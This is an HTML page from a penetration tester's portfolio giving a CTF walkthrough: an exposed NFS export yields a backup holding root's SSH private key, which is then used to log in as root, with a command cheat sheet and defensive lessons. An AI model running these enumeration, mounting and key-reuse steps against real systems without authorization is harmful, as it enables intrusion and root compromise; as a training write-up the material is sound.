@@ -1,0 +1,250 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>NFS CTF Walkthrough | Ahmed Vasil</title>
+  <meta name="description" content="NFS CTF deep walkthrough — an exposed NFS share leaks a backup of root's home directory and root's SSH private key.">
+  <link rel="canonical" href="https://vasilahmed744.github.io/Ahmed-Vasil-Portfolio/walkthrough-nfs.html">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&amp;family=IBM+Plex+Serif:ital,wght@0,500;0,600;0,700;1,500&amp;display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/styles.css">
+</head>
+<body>
+<header class="topbar">
+  <div class="wrap topbar-inner">
+    <a class="brand" href="index.html"><span class="brand-mark">AV</span><span><span class="brand-name">Ahmed Vasil</span><br><span class="brand-role">Aspiring Penetration Tester</span></span></a>
+    <nav class="main-nav" aria-label="Main navigation">
+      <a href="index.html">Home</a>
+      <a href="about.html">About</a>
+      <a href="projects.html">Projects</a>
+      <a href="skills.html">Skills</a>
+      <a href="journey.html">Journey</a>
+      <a href="walkthroughs.html" class="active">Walkthroughs</a>
+      <a href="contact.html" class="nav-cta">Contact</a>
+    </nav>
+  </div>
+</header>
+<main>
+  <div class="wrap">
+    <div class="page-head anim d1">
+      <span class="eyebrow"><span class="section-no">06</span>Walkthroughs · Privilege Escalation</span>
+      <div class="gold-rule"></div>
+      <h1>NFS CTF — Complete Deep Walkthrough</h1>
+      <p class="lede">Enumerate the target, identify the exposed NFS share, recover the leaked root SSH private key, authenticate as root, and retrieve the flag.</p>
+    </div>
+    <section class="block wt-content">
+      <table class="info-table anim d2">
+        <tr><th>Target</th><td>172.31.0.113</td></tr>
+        <tr><th>Objective</th><td>Enumerate the target, identify the exposed NFS share, recover the leaked root SSH private key, authenticate as root, and retrieve the flag.</td></tr>
+      </table>
+      <div class="note anim d2"><strong>Scope note.</strong> This walkthrough documents the authorized CTF target solved in the session. Use the techniques only on systems you own or are explicitly authorized to test.</div>
+
+      <h2 class="anim d2">1. Initial reconnaissance with Nmap</h2>
+      <p>The first step was service discovery. The scan used aggressive detection so that open ports, service versions, scripts, and OS hints could be collected in one pass.</p>
+      <pre class="code"><code>nmap -A 172.31.0.113 --min-rate 8000 -T5</code></pre>
+      <p>Important findings: TCP/22 exposed OpenSSH, TCP/111 exposed rpcbind, and TCP/2049 exposed NFS. rpcbind also revealed NFS-related RPC programs such as mountd and nfs_acl.</p>
+      <pre class="code"><code>22/tcp   open     ssh       OpenSSH 8.4p1 Debian
+111/tcp  open     rpcbind
+2049/tcp open     nfs       3-4</code></pre>
+      <p>Port 22 alone did not provide credentials. The combination of 111 + 2049 was much more interesting because it indicated a remotely reachable Network File System. In a CTF, an NFS export may expose backups, home directories, SSH material, scripts, or writable files.</p>
+
+      <h2>2. What rpcbind and NFS mean</h2>
+      <p>rpcbind maps RPC program numbers to network ports. NFS historically relies on RPC services, so seeing port 111 can help reveal services such as NFS and mountd.</p>
+      <p>NFS (Network File System) allows a directory on one Linux/Unix machine to be made available to another machine over the network. The remote directory is called an export. A client can mount that export into its own filesystem and then interact with it according to the server's export and filesystem permissions.</p>
+
+      <h2>3. Enumerating NFS exports</h2>
+      <p>The next step was asking the target which directories it exported:</p>
+      <pre class="code"><code>showmount -e 172.31.0.113</code></pre>
+      <p>The server returned:</p>
+      <pre class="code"><code>Export list for 172.31.0.113:
+/var/share *</code></pre>
+      <p>This identified /var/share as an NFS export. The * indicates that the export rule is not restricted to a specific named client/host in this listing. That is a major lead, although normal filesystem and NFS permission behavior still applies.</p>
+
+      <h2>4. Mounting the remote share</h2>
+      <p>A local mount point was created on Kali:</p>
+      <pre class="code"><code>sudo mkdir -p /mnt/ctf_nfs</code></pre>
+      <p>Then the remote export was attached to that directory:</p>
+      <pre class="code"><code>sudo mount -t nfs 172.31.0.113:/var/share /mnt/ctf_nfs</code></pre>
+      <table class="wt-table">
+        <tr><th>Part</th><th>Meaning</th></tr>
+        <tr><td><code>sudo</code></td><td>Mounting normally requires elevated local privileges.</td></tr>
+        <tr><td><code>mount</code></td><td>Attaches a filesystem to the local directory tree.</td></tr>
+        <tr><td><code>-t nfs</code></td><td>Specifies that the filesystem type is NFS.</td></tr>
+        <tr><td><code>172.31.0.113:/var/share</code></td><td>Remote server and exported directory.</td></tr>
+        <tr><td><code>/mnt/ctf_nfs</code></td><td>Local directory where the export becomes accessible.</td></tr>
+      </table>
+      <p>The mount was verified with:</p>
+      <pre class="code"><code>mount | grep 172.31.0.113</code></pre>
+      <p>It showed that the share was mounted read-write using NFSv4.2. This confirmed that Kali could actually access the export.</p>
+
+      <h2>5. Inspecting the export</h2>
+      <pre class="code"><code>ls -la /mnt/ctf_nfs</code></pre>
+      <p>The important result was:</p>
+      <pre class="code"><code>-rwxrwxrwx 1 root root 2351 Sep 25 2023 package.tar.gz</code></pre>
+      <p>The archive was owned by root and had mode 777. In symbolic form, the three rwx groups represent owner, group, and others. However, modification was not needed: the useful information was already exposed inside the archive.</p>
+
+      <h2>6. Inspecting the tar.gz before extracting</h2>
+      <p>Instead of blindly extracting or executing anything, the archive contents were listed first:</p>
+      <pre class="code"><code>tar -tzvf /mnt/ctf_nfs/package.tar.gz</code></pre>
+      <p>Options:</p>
+      <ul>
+        <li><code class="inline">t</code> = list archive contents</li>
+        <li><code class="inline">z</code> = process gzip compression</li>
+        <li><code class="inline">v</code> = verbose output</li>
+        <li><code class="inline">f</code> = the next argument is the archive filename</li>
+      </ul>
+      <p>The archive contained a backup of root's home directory, including:</p>
+      <pre class="code"><code>root/.ssh/id_ecdsa
+root/.ssh/authorized_keys
+root/.ssh/id_ecdsa.pub
+root/.viminfo
+root/.bash_history
+root/.bashrc
+root/.profile</code></pre>
+      <p>The critical discovery was <code class="inline">root/.ssh/id_ecdsa</code>. This is an SSH private key. A private key is authentication material and should never be exposed in a publicly reachable backup/share.</p>
+
+      <h2>7. Extracting the backup safely</h2>
+      <pre class="code"><code>mkdir -p ~/redteam_ctfs/nfs_extract
+cd ~/redteam_ctfs/nfs_extract
+tar -xzvf /mnt/ctf_nfs/package.tar.gz</code></pre>
+      <p>Here <code class="inline">x</code> means extract. The private key was then available locally at <code class="inline">~/redteam_ctfs/nfs_extract/root/.ssh/id_ecdsa</code>.</p>
+
+      <h2>8. Why chmod 600 was required</h2>
+      <pre class="code"><code>chmod 600 root/.ssh/id_ecdsa</code></pre>
+      <p>OpenSSH deliberately rejects private keys whose local permissions are too open. Mode 600 means the owner can read and write the file, while group and others receive no permissions.</p>
+      <pre class="code"><code>6 = 4(read) + 2(write)
+0 = no permissions
+0 = no permissions
+
+600 =&gt; rw-------</code></pre>
+      <p>This does not change the key cryptographically. It only protects the local copy sufficiently for the SSH client to accept it.</p>
+
+      <h2>9. Authenticating to SSH as root</h2>
+      <p>Because the archive was explicitly a backup of root's home directory and contained root's SSH key material, the key was tested against the target's SSH service:</p>
+      <pre class="code"><code>ssh -i root/.ssh/id_ecdsa root@172.31.0.113</code></pre>
+      <table class="wt-table">
+        <tr><th>Part</th><th>Meaning</th></tr>
+        <tr><td><code>ssh</code></td><td>OpenSSH client</td></tr>
+        <tr><td><code>-i root/.ssh/id_ecdsa</code></td><td>Use this private identity key</td></tr>
+        <tr><td><code>root@</code></td><td>Authenticate as the root account</td></tr>
+        <tr><td><code>172.31.0.113</code></td><td>Target host</td></tr>
+      </table>
+      <p>Authentication succeeded and the prompt became:</p>
+      <pre class="code"><code>root@ip-172-31-0-113:~#</code></pre>
+      <p>At this point the compromise was confirmed directly with the root shell. No privilege-escalation exploit was necessary: the exposed backup leaked an authentication secret that already belonged to root.</p>
+
+      <h2>10. Retrieving the flag</h2>
+      <p>Listing root's home directory showed the challenge flag:</p>
+      <pre class="code"><code>ls -la
+
+-r-------- 1 root root 38 Sep 25 2023 flag.txt</code></pre>
+      <p>It was read with:</p>
+      <pre class="code"><code>cat /root/flag.txt</code></pre>
+      <p>When troubleshooting the initial submission, this command was also used:</p>
+      <pre class="code"><code>cat -A /root/flag.txt</code></pre>
+      <p>With <code class="inline">cat -A</code>, a trailing $ is normally a visual marker showing the end of a line; it is not part of the flag. Therefore only the characters through the closing } should be submitted.</p>
+      <div class="note"><strong>Note on the flag.</strong> The original document records the flag as read from <code class="inline">/root/flag.txt</code> but does not print its value in the extracted text, so no flag value is shown here — nothing has been invented to fill the gap.</div>
+
+      <h2>11. Complete attack path</h2>
+      <pre class="code"><code>Nmap reconnaissance
+        |
+        v
+111/rpcbind + 2049/NFS discovered
+        |
+        v
+showmount -e 172.31.0.113
+        |
+        v
+/var/share exported
+        |
+        v
+Mount NFS export locally
+        |
+        v
+package.tar.gz discovered
+        |
+        v
+Inspect archive with tar -tzvf
+        |
+        v
+root/.ssh/id_ecdsa exposed
+        |
+        v
+Extract archive + chmod 600 private key
+        |
+        v
+SSH as root
+        |
+        v
+/root/flag.txt</code></pre>
+
+      <h2>12. Root cause — what was actually vulnerable?</h2>
+      <p>The core security failure was sensitive backup exposure through NFS. The NFS share made a package containing root's private SSH authentication material accessible to the CTF client. Once the private key was recovered, the existing SSH service accepted it for the root account.</p>
+      <p>The important lesson is that the weakness was not simply "NFS exists". NFS can be deployed securely. The dangerous combination here was an accessible export plus a backup containing a high-value secret. Broad export rules and overly permissive file modes increased the exposure.</p>
+
+      <h2>13. Defensive lessons</h2>
+      <p>A secure environment should restrict NFS exports to required clients/networks, apply appropriate export options and filesystem permissions, avoid storing private SSH keys in shared backups, protect backup repositories as sensitive assets, disable direct root SSH access where appropriate, and rotate any credential or private key immediately if it is exposed.</p>
+      <p>If a private key like this leaks in a real environment, merely deleting the leaked copy is insufficient. The corresponding authorized key should be removed/revoked and replaced with new key material.</p>
+
+      <h2>14. Command cheat sheet from this CTF</h2>
+      <pre class="code"><code># Initial service enumeration
+nmap -A 172.31.0.113 --min-rate 8000 -T5
+
+# Enumerate NFS exports
+showmount -e 172.31.0.113
+
+# Create local mount point
+sudo mkdir -p /mnt/ctf_nfs
+
+# Mount the export
+sudo mount -t nfs 172.31.0.113:/var/share /mnt/ctf_nfs
+
+# Confirm the mount
+mount | grep 172.31.0.113
+
+# List exposed files
+ls -la /mnt/ctf_nfs
+
+# Inspect archive without extracting
+tar -tzvf /mnt/ctf_nfs/package.tar.gz
+
+# Create working directory and extract
+mkdir -p ~/redteam_ctfs/nfs_extract
+cd ~/redteam_ctfs/nfs_extract
+tar -xzvf /mnt/ctf_nfs/package.tar.gz
+
+# Protect the recovered private key locally
+chmod 600 root/.ssh/id_ecdsa
+
+# Authenticate using the recovered key
+ssh -i root/.ssh/id_ecdsa root@172.31.0.113
+
+# Enumerate root home and read flag
+ls -la
+cat /root/flag.txt
+
+# Show otherwise invisible line endings if troubleshooting
+cat -A /root/flag.txt</code></pre>
+
+      <h2>15. Key takeaway</h2>
+      <p>The transferable methodology is: enumerate services → investigate unusual/exposed services → inspect accessible data carefully → identify credentials or secrets → understand what identity the secret belongs to → test the legitimate authentication service → verify obtained privileges. In this challenge, careful NFS enumeration was more important than trying to attack SSH directly.</p>
+      <div class="wt-nav">
+        <a href="walkthrough-cpt-exam.html">← CPT Practical Exam</a>
+        <a href="walkthrough-sudoers-less.html">Next: Sudoers / less CTF →</a>
+      </div>
+    </section>
+  </div>
+</main>
+<footer>
+  <div class="wrap footer-cta"><a href="contact.html">Work with me →</a></div>
+  <div class="wrap footer-inner">
+    <span class="f-name">Ahmed Vasil</span>
+    <span class="f-role">Aspiring Penetration Tester</span>
+    <span class="footer-links"><a href="https://github.com/vasilahmed744">GitHub</a><a href="https://www.linkedin.com/in/ahamad-vasil-205590386">LinkedIn</a></span>
+  </div>
+  <div class="wrap footer-base"><span>© Ahmed Vasil</span><span>Narasimharajapura, Karnataka, India</span></div>
+</footer>
+</body>
+</html>
